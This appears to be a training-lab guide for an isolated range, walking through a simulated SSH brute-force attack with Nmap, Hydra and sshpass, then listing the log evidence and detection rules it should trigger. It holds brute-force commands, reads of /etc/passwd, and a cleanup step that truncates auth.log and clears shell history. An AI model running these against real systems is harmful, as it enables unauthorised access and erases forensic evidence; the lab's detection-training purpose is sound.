# Scenario 1: SSH Credential Testing (Brute-Force Simulation)

> **⚠️ EDUCATIONAL USE ONLY — Run exclusively in the AegisRange isolated lab environment.**

## Overview

| Field | Value |
|---|---|
| **Scenario** | SSH Credential Testing via Dictionary Attack |
| **MITRE ATT&CK** | T1110.001 — Brute Force: Password Guessing |
| **Objective** | Demonstrate how repeated authentication failures generate detectable log patterns |
| **Target** | `aegis-linux` (10.10.10.20), SSH on port 22 |
| **Attacker** | `aegis-kali` (10.10.10.10) |
| **Credentials** | `labuser` / `labpass123` (intentionally weak for lab) |

## Attack Steps

### Phase 1 — Reconnaissance
1. Run an Nmap service scan against the Linux target to identify open ports
2. Confirm SSH (port 22) is available

### Phase 2 — Credential Testing
3. Use Hydra with a small custom wordlist (~30 entries) to test SSH credentials
4. The wordlist contains the correct password near the end to generate ~25 failed attempts first
5. Hydra reports the successful credential pair

### Phase 3 — Post-Authentication Activity
6. Log in with the discovered credentials via SSH
7. Run standard enumeration commands: `whoami`, `id`, `uname -a`, `cat /etc/passwd`, `ip addr`
8. These commands generate audit trail entries for investigation

## Running the Scenario

```bash
# From the Kali VM
cd /opt/aegisrange/attacks/scenario1-bruteforce

# Run the full automated scenario
bash bruteforce.sh

# Or run each phase manually:
# Phase 1
nmap -sV -p 22,21 10.10.10.20

# Phase 2
hydra -l labuser -P wordlist.txt ssh://10.10.10.20 -t 4 -V

# Phase 3
sshpass -p "labpass123" ssh labuser@10.10.10.20
```

## Expected Evidence

| # | Evidence | Source | Location | Detection |
|---|---|---|---|---|
| 1 | Multiple failed SSH login attempts | sshd | `/var/log/auth.log` | >5 failed logins from same IP in 60s |
| 2 | Successful SSH login after failures | sshd | `/var/log/auth.log` | Successful login from previously-failing IP |
| 3 | Nmap service probe | sshd / network | `/var/log/auth.log` + network logs | Connection without full auth handshake |
| 4 | Post-login command execution | auditd | `/var/log/audit/audit.log` | `execve` syscall records |
| 5 | Sensitive file access | auditd | `/var/log/audit/audit.log` | Read access to `/etc/passwd` |

## Example Log Entries

### Failed SSH Login (`/var/log/auth.log`)
```
Oct 21 14:23:01 aegis-linux sshd[1234]: Failed password for labuser from 10.10.10.10 port 45678 ssh2
Oct 21 14:23:02 aegis-linux sshd[1234]: Failed password for labuser from 10.10.10.10 port 45679 ssh2
```

### Successful SSH Login (`/var/log/auth.log`)
```
Oct 21 14:23:15 aegis-linux sshd[1234]: Accepted password for labuser from 10.10.10.10 port 45702 ssh2
Oct 21 14:23:15 aegis-linux sshd[1234]: pam_unix(sshd:session): session opened for user labuser
```

## Detection Rules That Should Fire

> [!NOTE]
> These `AEGIS-RULE-*` identifiers are **planned** detection content; they are not in
> `main.py` and nothing stores a rule id. What the backend does today is count logs per
> source IP: 3 or more from the same `source_ip` within 5 minutes raise one incident titled
> `Suspicious activity from <source_ip>`, with severity `low` (3-4), `medium` (5-9) or
> `high` (10+) — lowercase, and no `critical`. Verify this run with
> `curl "http://localhost:8000/api/incidents?source_ip=10.10.10.10"` or on the dashboard at
> <http://localhost:8501>.

1. **AEGIS-RULE-001**: Multiple failed SSH authentications from single source (threshold: >5 in 60 seconds)
2. **AEGIS-RULE-002**: Successful authentication following multiple failures (pattern: fail→fail→...→success)
3. **AEGIS-RULE-003**: Sensitive file access post-authentication (`/etc/passwd`, `/etc/shadow`)

## Cleanup / Reset

```bash
# On the Linux target, clear evidence for re-testing:
sudo truncate -s 0 /var/log/auth.log
sudo systemctl restart rsyslog
history -c
```

Or restore the VM from snapshot: `vagrant snapshot restore aegis-linux clean`
